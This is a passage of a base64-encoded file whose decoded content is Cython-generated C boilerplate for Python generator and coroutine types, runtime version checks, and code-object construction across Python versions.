iAgICBpZiAocmVzdWx0KSBQeV9SRVRVUk5fVFJVRTsKICAgIGVsc2UgUHlfUkVUVVJOX0ZBTFNFOwp9CiNpZiBfX1BZWF9IQVNfUFlfQU1fU0VORCA9PSAyCnN0YXRpYyB2b2lkIF9fUHl4X1NldEJhY2twb3J0VHlwZUFtU2VuZChQeVR5cGVPYmplY3QgKnR5cGUsIF9fUHl4X1B5QXN5bmNNZXRob2RzU3RydWN0ICpzdGF0aWNfYW1zZW5kX21ldGhvZHMsIF9fUHl4X3B5aXRlcl9zZW5kZnVuYyBhbV9zZW5kKSB7CiAgICBQeV9zc2l6ZV90IHB0cl9vZmZzZXQgPSAoY2hhciopKHR5cGUtPnRwX2FzX2FzeW5jKSAtIChjaGFyKil0eXBlOwogICAgaWYgKHB0cl9vZmZzZXQgPCAwIHx8IHB0cl9vZmZzZXQgPiB0eXBlLT50cF9iYXNpY3NpemUpIHsKICAgICAgICByZXR1cm47CiAgICB9CiAgICBtZW1jcHkoKHZvaWQqKXN0YXRpY19hbXNlbmRfbWV0aG9kcywgKHZvaWQqKSh0eXBlLT50cF9hc19hc3luYyksIHNpemVvZigqdHlwZS0+dHBfYXNfYXN5bmMpKTsKICAgIHN0YXRpY19hbXNlbmRfbWV0aG9kcy0+YW1fc2VuZCA9IGFtX3NlbmQ7CiAgICB0eXBlLT50cF9hc19hc3luYyA9IF9fUHl4X1Nsb3RUcEFzQXN5bmMoc3RhdGljX2Ftc2VuZF9tZXRob2RzKTsKfQojZW5kaWYKc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9Db3JvdXRpbmVfZmFpbF9yZWR1Y2VfZXgoUHlPYmplY3QgKnNlbGYsIFB5T2JqZWN0ICphcmcpIHsKICAgIENZVEhPTl9VTlVTRURfVkFSKGFyZyk7CiAgICBfX1B5eF9UeXBlTmFtZSBzZWxmX3R5cGVfbmFtZSA9IF9fUHl4X1B5VHlwZV9HZXRGdWxseVF1YWxpZmllZE5hbWUoUHlfVFlQRSgoUHlPYmplY3QqKXNlbGYpKTsKICAgIFB5RXJyX0Zvcm1hdChQeUV4Y19UeXBlRXJyb3IsICJjYW5ub3QgcGlja2xlICciIF9fUHl4X0ZNVF9UWVBFTkFNRSAiJyBvYmplY3QiLAogICAgICAgICAgICAgICAgICAgICAgICAgc2VsZl90eXBlX25hbWUpOwogICAgX19QeXhfREVDUkVGX1R5cGVOYW1lKHNlbGZfdHlwZV9uYW1lKTsKICAgIHJldHVybiBOVUxMOwp9CgoKc3RhdGljIFB5TWV0aG9kRGVmIF9fcHl4X0dlbmVyYXRvcl9tZXRob2RzW10gPSB7CiAgICB7InNlbmQiLCAoUHlDRnVuY3Rpb24pIF9fUHl4X0Nvcm91dGluZV9TZW5kLCBNRVRIX08sCiAgICAgUHlEb2NfU1RSKCJzZW5kKGFyZykgLT4gc2VuZCAnYXJnJyBpbnRvIGdlbmVyYXRvcixcbnJldHVybiBuZXh0IHlpZWxkZWQgdmFsdWUgb3IgcmFpc2UgU3RvcEl0ZXJhdGlvbi4iKX0sCiAgICB7InRocm93IiwgKFB5Q0Z1bmN0aW9uKSBfX1B5eF9Db3JvdXRpbmVfVGhyb3csIE1FVEhfVkFSQVJHUywKICAgICBQeURvY19TVFIoInRocm93KHR5cFssdmFsWyx0Yl1dKSAtPiByYWlzZSBleGNlcHRpb24gaW4gZ2VuZXJhdG9yLFxucmV0dXJuIG5leHQgeWllbGRlZCB2YWx1ZSBvciByYWlzZSBTdG9wSXRlcmF0aW9uLiIpfSwKICAgIHsiY2xvc2UiLCAoUHlDRnVuY3Rpb24pIF9fUHl4X0Nvcm91dGluZV9DbG9zZV9NZXRob2QsIE1FVEhfTk9BUkdTLAogICAgIFB5RG9jX1NUUigiY2xvc2UoKSAtPiByYWlzZSBHZW5lcmF0b3JFeGl0IGluc2lkZSBnZW5lcmF0b3IuIil9LAogICAgeyJfX3JlZHVjZV9leF9fIiwgKFB5Q0Z1bmN0aW9uKSBfX1B5eF9Db3JvdXRpbmVfZmFpbF9yZWR1Y2VfZXgsIE1FVEhfTywgMH0sCiAgICB7Il9fcmVkdWNlX18iLCAoUHlDRnVuY3Rpb24pIF9fUHl4X0Nvcm91dGluZV9mYWlsX3JlZHVjZV9leCwgTUVUSF9OT0FSR1MsIDB9LAogICAgezAsIDAsIDAsIDB9Cn07CnN0YXRpYyBQeU1lbWJlckRlZiBfX3B5eF9HZW5lcmF0b3JfbWVtYmVybGlzdFtdID0gewogICAgeyJnaV95aWVsZGZyb20iLCBUX09CSkVDVCwgb2Zmc2V0b2YoX19weXhfQ29yb3V0aW5lT2JqZWN0LCB5aWVsZGZyb20pLCBSRUFET05MWSwKICAgICBQeURvY19TVFIoIm9iamVjdCBiZWluZyBpdGVyYXRlZCBieSAneWllbGQgZnJvbScsIG9yIE5vbmUiKX0sCiAgICB7ImdpX2NvZGUiLCBUX09CSkVDVCwgb2Zmc2V0b2YoX19weXhfQ29yb3V0aW5lT2JqZWN0LCBnaV9jb2RlKSwgUkVBRE9OTFksIE5VTEx9LAogICAgeyJfX21vZHVsZV9fIiwgVF9PQkpFQ1QsIG9mZnNldG9mKF9fcHl4X0Nvcm91dGluZU9iamVjdCwgZ2lfbW9kdWxlbmFtZSksIDAsIDB9LAogICAgeyJfX3dlYWtsaXN0b2Zmc2V0X18iLCBUX1BZU1NJWkVULCBvZmZzZXRvZihfX3B5eF9Db3JvdXRpbmVPYmplY3QsIGdpX3dlYWtyZWZsaXN0KSwgUkVBRE9OTFksIDB9LAogICAgezAsIDAsIDAsIDAsIDB9Cn07CnN0YXRpYyBQeUdldFNldERlZiBfX3B5eF9HZW5lcmF0b3JfZ2V0c2V0c1tdID0gewogICAgeyJfX25hbWVfXyIsIChnZXR0ZXIpX19QeXhfQ29yb3V0aW5lX2dldF9uYW1lLCAoc2V0dGVyKV9fUHl4X0Nvcm91dGluZV9zZXRfbmFtZSwKICAgICBQeURvY19TVFIoIm5hbWUgb2YgdGhlIGdlbmVyYXRvciIpLCAwfSwKICAgIHsiX19xdWFsbmFtZV9fIiwgKGdldHRlcilfX1B5eF9Db3JvdXRpbmVfZ2V0X3F1YWxuYW1lLCAoc2V0dGVyKV9fUHl4X0Nvcm91dGluZV9zZXRfcXVhbG5hbWUsCiAgICAgUHlEb2NfU1RSKCJxdWFsaWZpZWQgbmFtZSBvZiB0aGUgZ2VuZXJhdG9yIiksIDB9LAogICAgeyJnaV9mcmFtZSIsIChnZXR0ZXIpX19QeXhfQ29yb3V0aW5lX2dldF9mcmFtZSwgTlVMTCwKICAgICBQeURvY19TVFIoIkZyYW1lIG9mIHRoZSBnZW5lcmF0b3IiKSwgMH0sCiAgICB7ImdpX3J1bm5pbmciLCBfX1B5eF9Db3JvdXRpbmVfZ2V0X2lzX3J1bm5pbmdfZ2V0dGVyLCBOVUxMLCBOVUxMLCBOVUxMfSwKICAgIHswLCAwLCAwLCAwLCAwfQp9OwpzdGF0aWMgUHlUeXBlX1Nsb3QgX19weXhfR2VuZXJhdG9yVHlwZV9zbG90c1tdID0gewogICAge1B5X3RwX2RlYWxsb2MsICh2b2lkICopX19QeXhfQ29yb3V0aW5lX2RlYWxsb2N9LAogICAge1B5X3RwX3RyYXZlcnNlLCAodm9pZCAqKV9fUHl4X0Nvcm91dGluZV90cmF2ZXJzZX0sCiAgICB7UHlfdHBfaXRlciwgKHZvaWQgKilQeU9iamVjdF9TZWxmSXRlcn0sCiAgICB7UHlfdHBfaXRlcm5leHQsICh2b2lkICopX19QeXhfR2VuZXJhdG9yX05leHR9LAogICAge1B5X3RwX21ldGhvZHMsICh2b2lkICopX19weXhfR2VuZXJhdG9yX21ldGhvZHN9LAogICAge1B5X3RwX21lbWJlcnMsICh2b2lkICopX19weXhfR2VuZXJhdG9yX21lbWJlcmxpc3R9LAogICAge1B5X3RwX2dldHNldCwgKHZvaWQgKilfX3B5eF9HZW5lcmF0b3JfZ2V0c2V0c30sCiAgICB7UHlfdHBfZ2V0YXR0cm8sICh2b2lkICopIFB5T2JqZWN0X0dlbmVyaWNHZXRBdHRyfSwKI2lmIENZVEhPTl9VU0VfVFBfRklOQUxJWkUKICAgIHtQeV90cF9maW5hbGl6ZSwgKHZvaWQgKilfX1B5eF9Db3JvdXRpbmVfZGVsfSwKI2VuZGlmCiNpZiBfX1BZWF9IQVNfUFlfQU1fU0VORCA9PSAxCiAgICB7UHlfYW1fc2VuZCwgKHZvaWQgKilfX1B5eF9Db3JvdXRpbmVfQW1TZW5kfSwKI2VuZGlmCiAgICB7MCwgMH0sCn07CnN0YXRpYyBQeVR5cGVfU3BlYyBfX3B5eF9HZW5lcmF0b3JUeXBlX3NwZWMgPSB7CiAgICBfX1BZWF9UWVBFX01PRFVMRV9QUkVGSVggImdlbmVyYXRvciIsCiAgICBzaXplb2YoX19weXhfQ29yb3V0aW5lT2JqZWN0KSwKICAgIDAsCiNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMEEwMDAwCiAgICBQeV9UUEZMQUdTX0lNTVVUQUJMRVRZUEUgfAojZW5kaWYKICAgIFB5X1RQRkxBR1NfREVGQVVMVCB8IFB5X1RQRkxBR1NfSEFWRV9HQyB8IFB5X1RQRkxBR1NfSEFWRV9GSU5BTElaRSB8IF9fUHl4X1RQRkxBR1NfSEFWRV9BTV9TRU5ELAogICAgX19weXhfR2VuZXJhdG9yVHlwZV9zbG90cwp9OwojaWYgX19QWVhfSEFTX1BZX0FNX1NFTkQgPT0gMgpzdGF0aWMgX19QeXhfUHlBc3luY01ldGhvZHNTdHJ1Y3QgX19weXhfR2VuZXJhdG9yX2FzX2FzeW5jOwojZW5kaWYKc3RhdGljIGludCBfX3B5eF9HZW5lcmF0b3JfaW5pdChQeU9iamVjdCAqbW9kdWxlKSB7CiAgICBfX3B5eF9tc3RhdGV0eXBlICptc3RhdGUgPSBfX1B5eF9QeU1vZHVsZV9HZXRTdGF0ZShtb2R1bGUpOwogICAgbXN0YXRlLT5fX3B5eF9HZW5lcmF0b3JUeXBlID0gX19QeXhfRmV0Y2hDb21tb25UeXBlRnJvbVNwZWMoCiAgICAgICAgbXN0YXRlLT5fX3B5eF9Db21tb25UeXBlc01ldGFjbGFzc1R5cGUsIG1vZHVsZSwgJl9fcHl4X0dlbmVyYXRvclR5cGVfc3BlYywgTlVMTCk7CiAgICBpZiAodW5saWtlbHkoIW1zdGF0ZS0+X19weXhfR2VuZXJhdG9yVHlwZSkpIHsKICAgICAgICByZXR1cm4gLTE7CiAgICB9CiNpZiBfX1BZWF9IQVNfUFlfQU1fU0VORCA9PSAyCiAgICBfX1B5eF9TZXRCYWNrcG9ydFR5cGVBbVNlbmQobXN0YXRlLT5fX3B5eF9HZW5lcmF0b3JUeXBlLCAmX19weXhfR2VuZXJhdG9yX2FzX2FzeW5jLCAmX19QeXhfQ29yb3V0aW5lX0FtU2VuZCk7CiNlbmRpZgogICAgcmV0dXJuIDA7Cn0Kc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9HZW5lcmF0b3JfR2V0SW5saW5lZFJlc3VsdChQeU9iamVjdCAqc2VsZikgewogICAgX19weXhfQ29yb3V0aW5lT2JqZWN0ICpnZW4gPSAoX19weXhfQ29yb3V0aW5lT2JqZWN0Kikgc2VsZjsKICAgIFB5T2JqZWN0ICpyZXR2YWwgPSBOVUxMOwogICAgaWYgKHVubGlrZWx5KF9fUHl4X0Nvcm91dGluZV90ZXN0X2FuZF9zZXRfaXNfcnVubmluZyhnZW4pKSkgewogICAgICAgIHJldHVybiBfX1B5eF9Db3JvdXRpbmVfQWxyZWFkeVJ1bm5pbmdFcnJvcihnZW4pOwogICAgfQogICAgX19QeXhfUHlTZW5kUmVzdWx0IHJlc3VsdCA9IF9fUHl4X0Nvcm91dGluZV9TZW5kRXgoZ2VuLCBQeV9Ob25lLCAmcmV0dmFsLCAwKTsKICAgIF9fUHl4X0Nvcm91dGluZV91bnNldF9pc19ydW5uaW5nKGdlbik7CiAgICAodm9pZCkgcmVzdWx0OwogICAgYXNzZXJ0IChyZXN1bHQgPT0gUFlHRU5fUkVUVVJOIHx8IHJlc3VsdCA9PSBQWUdFTl9FUlJPUik7CiAgICBhc3NlcnQgKChyZXN1bHQgPT0gUFlHRU5fUkVUVVJOICYmIHJldHZhbCAhPSBOVUxMKSB8fCAocmVzdWx0ID09IFBZR0VOX0VSUk9SICYmIHJldHZhbCA9PSBOVUxMKSk7CiAgICByZXR1cm4gcmV0dmFsOwp9CgoKc3RhdGljIHVuc2lnbmVkIGxvbmcgX19QeXhfZ2V0X3J1bnRpbWVfdmVyc2lvbih2b2lkKSB7CiNpZiBfX1BZWF9MSU1JVEVEX1ZFUlNJT05fSEVYID49IDB4MDMwYjAwMDAKICAgIHJldHVybiBQeV9WZXJzaW9uICYgfjB4RkZVTDsKI2Vsc2UKICAgIHN0YXRpYyB1bnNpZ25lZCBsb25nIF9fUHl4X2NhY2hlZF9ydW50aW1lX3ZlcnNpb24gPSAwOwogICAgaWYgKF9fUHl4X2NhY2hlZF9ydW50aW1lX3ZlcnNpb24gPT0gMCkgewogICAgICAgIGNvbnN0IGNoYXIqIHJ0X3ZlcnNpb24gPSBQeV9HZXRWZXJzaW9uKCk7CiAgICAgICAgdW5zaWduZWQgbG9uZyB2ZXJzaW9uID0gMDsKICAgICAgICB1bnNpZ25lZCBsb25nIGZhY3RvciA9IDB4MDEwMDAwMDBVTDsKICAgICAgICB1bnNpZ25lZCBpbnQgZGlnaXQgPSAwOwogICAgICAgIGludCBpID0gMDsKICAgICAgICB3aGlsZSAoZmFjdG9yKSB7CiAgICAgICAgICAgIHdoaWxlICgnMCcgPD0gcnRfdmVyc2lvbltpXSAmJiBydF92ZXJzaW9uW2ldIDw9ICc5JykgewogICAgICAgICAgICAgICAgZGlnaXQgPSBkaWdpdCAqIDEwICsgKHVuc2lnbmVkIGludCkgKHJ0X3ZlcnNpb25baV0gLSAnMCcpOwogICAgICAgICAgICAgICAgKytpOwogICAgICAgICAgICB9CiAgICAgICAgICAgIHZlcnNpb24gKz0gZmFjdG9yICogZGlnaXQ7CiAgICAgICAgICAgIGlmIChydF92ZXJzaW9uW2ldICE9ICcuJykKICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICBkaWdpdCA9IDA7CiAgICAgICAgICAgIGZhY3RvciA+Pj0gODsKICAgICAgICAgICAgKytpOwogICAgICAgIH0KICAgICAgICBfX1B5eF9jYWNoZWRfcnVudGltZV92ZXJzaW9uID0gdmVyc2lvbjsKICAgIH0KICAgIHJldHVybiBfX1B5eF9jYWNoZWRfcnVudGltZV92ZXJzaW9uOwojZW5kaWYKfQoKCnN0YXRpYyBpbnQgX19QeXhfY2hlY2tfYmluYXJ5X3ZlcnNpb24odW5zaWduZWQgbG9uZyBjdF92ZXJzaW9uLCB1bnNpZ25lZCBsb25nIHJ0X3ZlcnNpb24sIGludCBhbGxvd19uZXdlcikgewogICAgY29uc3QgdW5zaWduZWQgbG9uZyBNQUpPUl9NSU5PUiA9IDB4RkZGRjAwMDBVTDsKICAgIGlmICgocnRfdmVyc2lvbiAmIE1BSk9SX01JTk9SKSA9PSAoY3RfdmVyc2lvbiAmIE1BSk9SX01JTk9SKSkKICAgICAgICByZXR1cm4gMDsKICAgIGlmIChsaWtlbHkoYWxsb3dfbmV3ZXIgJiYgKHJ0X3ZlcnNpb24gJiBNQUpPUl9NSU5PUikgPiAoY3RfdmVyc2lvbiAmIE1BSk9SX01JTk9SKSkpCiAgICAgICAgcmV0dXJuIDE7CiAgICB7CiAgICAgICAgY2hhciBtZXNzYWdlWzIwMF07CiAgICAgICAgUHlPU19zbnByaW50ZihtZXNzYWdlLCBzaXplb2YobWVzc2FnZSksCiAgICAgICAgICAgICAgICAgICAgICAiY29tcGlsZSB0aW1lIFB5dGhvbiB2ZXJzaW9uICVkLiVkICIKICAgICAgICAgICAgICAgICAgICAgICJvZiBtb2R1bGUgJyUuMTAwcycgIgogICAgICAgICAgICAgICAgICAgICAgIiVzICIKICAgICAgICAgICAgICAgICAgICAgICJydW50aW1lIHZlcnNpb24gJWQuJWQiLAogICAgICAgICAgICAgICAgICAgICAgIChpbnQpIChjdF92ZXJzaW9uID4+IDI0KSwgKGludCkgKChjdF92ZXJzaW9uID4+IDE2KSAmIDB4RkYpLAogICAgICAgICAgICAgICAgICAgICAgIF9fUHl4X01PRFVMRV9OQU1FLAogICAgICAgICAgICAgICAgICAgICAgIChhbGxvd19uZXdlcikgPyAid2FzIG5ld2VyIHRoYW4iIDogImRvZXMgbm90IG1hdGNoIiwKICAgICAgICAgICAgICAgICAgICAgICAoaW50KSAocnRfdmVyc2lvbiA+PiAyNCksIChpbnQpICgocnRfdmVyc2lvbiA+PiAxNikgJiAweEZGKQogICAgICAgKTsKICAgICAgICByZXR1cm4gUHlFcnJfV2FybkV4KE5VTEwsIG1lc3NhZ2UsIDEpOwogICAgfQp9CgoKI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkKICAgIHN0YXRpYyBQeU9iamVjdCogX19QeXhfX1B5Q29kZV9OZXcoaW50IGEsIGludCBwLCBpbnQgaywgaW50IGwsIGludCBzLCBpbnQgZiwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUHlPYmplY3QgKmNvZGUsIFB5T2JqZWN0ICpjLCBQeU9iamVjdCogbiwgUHlPYmplY3QgKnYsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFB5T2JqZWN0ICpmdiwgUHlPYmplY3QgKmNlbGwsIFB5T2JqZWN0KiBmbiwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUHlPYmplY3QgKm5hbWUsIGludCBmbGluZSwgUHlPYmplY3QgKmxub3MpIHsKICAgICAgICBQeU9iamVjdCAqZXhjZXB0aW9uX3RhYmxlID0gTlVMTDsKICAgICAgICBQeU9iamVjdCAqdHlwZXNfbW9kdWxlPU5VTEwsICpjb2RlX3R5cGU9TlVMTCwgKnJlc3VsdD1OVUxMOwogICAgICAgICNpZiBfX1BZWF9MSU1JVEVEX1ZFUlNJT05fSEVYIDwgMHgwMzBiMDAwMAogICAgICAgIFB5T2JqZWN0ICp2ZXJzaW9uX2luZm87CiAgICAgICAgUHlPYmplY3QgKnB5X21pbm9yX3ZlcnNpb24gPSBOVUxMOwogICAgICAgICNlbmRpZgogICAgICAgIGxvbmcgbWlub3JfdmVyc2lvbiA9IDA7CiAgICAgICAgUHlPYmplY3QgKnR5cGUsICp2YWx1ZSwgKnRyYWNlYmFjazsKICAgICAgICBQeUVycl9GZXRjaCgmdHlwZSwgJnZhbHVlLCAmdHJhY2ViYWNrKTsKICAgICAgICAjaWYgX19QWVhfTElNSVRFRF9WRVJTSU9OX0hFWCA+PSAweDAzMGIwMDAwCiAgICAgICAgbWlub3JfdmVyc2lvbiA9IDExOwogICAgICAgICNlbHNlCiAgICAgICAgaWYgKCEodmVyc2lvbl9pbmZvID0gUHlTeXNfR2V0T2JqZWN0KCJ2ZXJzaW9uX2luZm8iKSkpIGdvdG8gZW5kOwogICAgICAgIGlmICghKHB5X21pbm9yX3ZlcnNpb24gPSBQeVNlcXVlbmNlX0dldEl0ZW0odmVyc2lvbl9pbmZvLCAxKSkpIGdvdG8gZW5kOwogICAgICAgIG1pbm9yX3ZlcnNpb24gPSBQeUxvbmdfQXNMb25nKHB5X21pbm9yX3ZlcnNpb24pOwogICAgICAgIFB5X0RFQ1JFRihweV9taW5vcl92ZXJzaW9uKTsKICAgICAgICBpZiAobWlub3JfdmVyc2lvbiA9PSAtMSAmJiBQeUVycl9PY2N1cnJlZCgpKSBnb3RvIGVuZDsKICAgICAgICAjZW5kaWYKICAgICAgICBpZiAoISh0eXBlc19tb2R1bGUgPSBQeUltcG9ydF9JbXBvcnRNb2R1bGUoInR5cGVzIikpKSBnb3RvIGVuZDsKICAgICAgICBpZiAoIShjb2RlX3R5cGUgPSBQeU9iamVjdF9HZXRBdHRyU3RyaW5nKHR5cGVzX21vZHVsZSwgIkNvZGVUeXBlIikpKSBnb3RvIGVuZDsKICAgICAgICBpZiAobWlub3JfdmVyc2lvbiA8PSA3KSB7CiAgICAgICAgICAgICh2b2lkKXA7CiAgICAgICAgICAgIHJlc3VsdCA9IFB5T2JqZWN0X0NhbGxGdW5jdGlvbihjb2RlX3R5cGUsICJpaWlpaU9PT09PT2lPT08iLCBhLCBrLCBsLCBzLCBmLCBjb2RlLAogICAgICAgICAgICAgICAgICAgICAgICAgIGMsIG4sIHYsIGZuLCBuYW1lLCBmbGluZSwgbG5vcywgZnYsIGNlbGwpOwogICAgICAgIH0gZWxzZSBpZiAobWlub3JfdmVyc2lvbiA8PSAxMCkgewogICAgICAgICAgICByZXN1bHQgPSBQeU9iamVjdF9DYWxsRnVuY3Rpb24oY29kZV90eXBlLCAiaWlpaWlpT09PT09PaU9PTyIsIGEscCwgaywgbCwgcywgZiwgY29kZSwKICAgICAgICAgICAgICAgICAgICAgICAgICBjLCBuLCB2LCBmbiwgbmFtZSwgZmxpbmUsIGxub3MsIGZ2LCBjZWxsKTsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICBpZiAoIShleGNlcHRpb25fdGFibGUgPSBQeUJ5dGVzX0Zyb21TdHJpbmdBbmRTaXplKE5VTEwsIDApKSkgZ290byBlbmQ7CiAgICAgICAgICAgIHJlc3VsdCA9IFB5T2JqZWN0X0NhbGxGdW5jdGlvbihjb2RlX3R5cGUsICJpaWlpaWlPT09PT09PaU9PT08iLCBhLHAsIGssIGwsIHMsIGYsIGNvZGUsCiAgICAgICAgICAgICAgICAgICAgICAgICAgYywgbiwgdiwgZm4sIG5hbWUsIG5hbWUsIGZsaW5lLCBsbm9zLCBleGNlcHRpb25fdGFibGUsIGZ2LCBjZWxsKTsKICAgICAgICB9CiAgICBlbmQ6CiAgICAgICAgUHlfWERFQ1JFRihjb2RlX3R5cGUpOwogICAgICAgIFB5X1hERUNSRUYoZXhjZXB0aW9uX3RhYmxlKTsKICAgICAgICBQeV9YREVDUkVGKHR5cGVzX21vZHVsZSk7CiAgICAgICAgaWYgKHR5cGUpIHsKICAgICAgICAgICAgUHlFcnJfUmVzdG9yZSh0eXBlLCB2YWx1ZSwgdHJhY2ViYWNrKTsKICAgICAgICB9CiAgICAgICAgcmV0dXJuIHJlc3VsdDsKICAgIH0KI2VsaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBCMDAwMAogIHN0YXRpYyBQeUNvZGVPYmplY3QqIF9fUHl4X19QeUNvZGVfTmV3KGludCBhLCBpbnQgcCwgaW50IGssIGludCBsLCBpbnQgcywgaW50IGYsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUHlPYmplY3QgKmNvZGUsIFB5T2JqZWN0ICpjLCBQeU9iamVjdCogbiwgUHlPYmplY3QgKnYsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUHlPYmplY3QgKmZ2LCBQeU9iamVjdCAqY2VsbCwgUHlPYmplY3QqIGZuLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFB5T2JqZWN0ICpuYW1lLCBpbnQgZmxpbmUsIFB5T2JqZWN0ICpsbm9zKSB7CiAgICBQeUNvZGVPYmplY3QgKnJlc3VsdDsKICAgIHJlc3VsdCA9CiAgICAgICNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMEMwMDAwCiAgICAgICAgUHlVbnN0YWJsZV9Db2RlX05ld1dpdGhQb3NPbmx5QXJncwogICAgICAjZWxzZQogICAgICAgIFB5Q29kZV9OZXdXaXRoUG9zT25seUFyZ3MKICAgICAgI2VuZGlmCiAgICAgICAgKGEsIHAsIGssIGwsIHMsIGYsIGNvZGUsIGMsIG4sIHYsIGZ2LCBjZWxsLCBmbiwgbmFtZSwgbmFtZSwgZmxpbmUsIGxub3MsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2VtcHR5X2J5dGVzKTsKICAgICNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT04gJiYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBjMDBBMQogICAgaWYgKGxpa2VseShyZXN1bHQpKQogICAgICAgIHJlc3VsdC0+X2NvX2ZpcnN0dHJhY2VhYmxlID0gMDsKICAgICNlbmRpZgogICAgcmV0dXJuIHJlc3VsdDsKICB9CiNlbGlmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwODAwQjIgJiYgIUNZVEhPTl9DT01QSUxJTkdfSU5fUFlQWQogICNkZWZpbmUgX19QeXhfX1B5Q29kZV9OZXcoYSwgcCwgaywgbCwgcywgZiwgY29kZSwgYywgbiwgdiwgZnYsIGNlbGwsIGZuLCBuYW1lLCBmbGluZSwgbG5vcylcCiAgICAgICAgICBQeUNvZGVfTmV3V2l0aFBvc09ubHlBcmdzKGEsIHAsIGssIGwsIHMsIGYsIGNvZGUsIGMsIG4sIHYsIGZ2LCBjZWxsLCBmbiwgbmFtZSwgZmxpbmUsIGxub3MpCiNlbHNlCiAgI2RlZmluZSBfX1B5eF9fUHlDb2RlX05ldyhhLCBwLCBrLCBsLCBzLCBmLCBjb2RlLCBjLCBuLCB2LCBmdiwgY2VsbCwgZm4sIG5hbWUsIGZsaW5lLCBsbm9zKVwKICAgICAgICAgIFB5Q29kZV9OZXcoYSwgaywgbCwgcywgZiwgY29kZSwgYywgbiwgdiwgZnYsIGNlbGwsIGZuLCBuYW1lLCBmbGluZSwgbG5vcykKI2VuZGlmCnN0YXRpYyBQeU9iamVjdCogX19QeXhfUHlDb2RlX05ldygKICAgICAgICBjb25zdCBfX1B5eF9QeUNvZGVfTmV3X2Z1bmN0aW9uX2Rlc2NyaXB0aW9uIGRlc2NyLAogICAgICAgIFB5T2JqZWN0ICogY29uc3QgKnZhcm5hbWVzLAogICAgICAgIFB5T2JqZWN0ICpmaWxlbmFtZSwKICAgICAgICBQeU9iamVjdCAqZnVuY25hbWUsCiAgICAgICAgY29uc3QgY2hhciAqbGluZV90YWJsZSwKICAgICAgICBQeU9iamVjdCAqdHVwbGVfZGVkdXBfbWFwCikgewogICAgUHlPYmplY3QgKmNvZGVfb2JqID0gTlVMTCwgKnZhcm5hbWVzX3R1cGxlX2RlZHVwID0gTlVMTCwgKmNvZGVfYnl0ZXMgPSBOVUxMLCAqbGluZV90YWJsZV9ieXRlcyA9IE5VTEw7CiAgICBQeV9zc2l6ZV90IHZhcl9jb3VudCA9IChQeV9zc2l6ZV90KSBkZXNjci5ubG9jYWxzOwogICAgUHlPYmplY3QgKnZhcm5hbWVzX3R1cGxlID0gUHlUdXBsZV9OZXcodmFyX2NvdW50KTsKICAgIGlmICh1bmxpa2VseSghdmFybmFtZXNfdHVwbGUpKSByZXR1cm4gTlVMTDsKICAgIGZvciAoUHlfc3NpemVfdCBpPTA7IGkgPCB2YXJfY291bnQ7IGkrKykgewogICAgICAgIFB5X0lOQ1JFRih2YXJuYW1lc1tpXSk7CiAgICAgICAgaWYgKF9fUHl4X1B5VHVwbGVfU0VUX0lURU0odmFybmFtZXNfdHVwbGUsIGksIHZhcm5hbWVzW2ldKSAhPSAoMCkpIGdvdG8gZG9uZTsKICAgIH0KICAgICNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJCiAgICB2YXJuYW1lc190dXBsZV9kZWR1cCA9IFB5RGljdF9HZXRJdGVtKHR1cGxlX2RlZHVwX21hcCwgdmFybmFtZXNfdHVwbGUpOwogICAgaWYgKCF2YXJuYW1lc190dXBsZV9kZWR1cCkgewogICAgICAgIGlmICh1bmxpa2VseShQeURpY3RfU2V0SXRlbSh0dXBsZV9kZWR1cF9tYXAsIHZhcm5hbWVzX3R1cGxlLCB2YXJuYW1lc190dXBsZSkgPCAwKSkgZ290byBkb25lOwogICAgICAgIHZhcm5hbWVzX3R1cGxlX2RlZHVwID0gdmFybmFtZXNfdHVwbGU7CiAgICB9CiAgICAjZWxzZQogICAgdmFybmFtZXNfdHVwbGVfZGVkdXAgPSBQeURpY3RfU2V0RGVmYXVsdCh0dXBsZV9kZWR1cF9tYXAsIHZhcm5hbWVzX3R1cGxlLCB2YXJuYW1lc190dXBsZSk7CiAgICBpZiAodW5saWtlbHkoIXZhcm5hbWVzX3R1cGxlX2RlZHVwKSkgZ290byBkb25lOwogICAgI2VuZGlmCiAgICAjaWYgQ1lUSE9OX0FWT0lEX0JPUlJPV0VEX1JFRlMKICAgIFB5X0lOQ1JFRih2YXJuYW1lc190dXBsZV9kZWR1cCk7CiAgICAjZW5kaWYKICAgIGlmIChfX1BZWF9MSU1JVEVEX1ZFUlNJT05fSEVYID49ICgweDAzMGIwMDAwKSAmJiBsaW5lX3RhYmxlICE9IE5VTEwKICAgICAgICAmJiAhQ1lUSE9OX0NPTVBJTElOR19JTl9HUkFBTCkgewogICAgICAgIGxpbmVfdGFibGVfYnl0ZXMgPSBQeUJ5dGVzX0Zyb21TdHJpbmdBbmRTaXplKGxpbmVfdGFibGUsIGRlc2NyLmxpbmVfdGFibGVfbGVuZ3RoKTsKICAgICAgICBpZiAodW5saWtlbHkoIWxpbmVfdGFibGVfYnl0ZXMpKSBnb3RvIGRvbmU7CiAgICAgICAgUHlfc3NpemVfdCBjb2RlX2xlbiA9IChkZXNjci5saW5lX3RhYmxlX2xlbmd0aCAqIDIgKyA0KSAmIH4zOwogICAgICAgIGNvZGVfYnl0ZXMgPSBQeUJ5dGVzX0Zyb21TdHJpbmdBbmRTaXplKE5VTEwsIGNvZGVfbGVuKTsKICAgICAgICBpZiAodW5saWtlbHkoIWNvZGVfYnl0ZXMpKSBnb3RvIGRvb